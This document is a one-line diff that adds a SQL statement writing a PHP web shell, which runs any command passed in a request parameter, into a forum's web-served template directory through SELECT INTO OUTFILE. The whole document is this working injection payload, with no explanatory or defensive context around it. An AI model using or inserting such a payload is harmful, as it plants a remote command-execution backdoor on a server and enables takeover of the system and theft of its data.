@@ -1,0 +1,1 @@
+SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/php_shell.php"
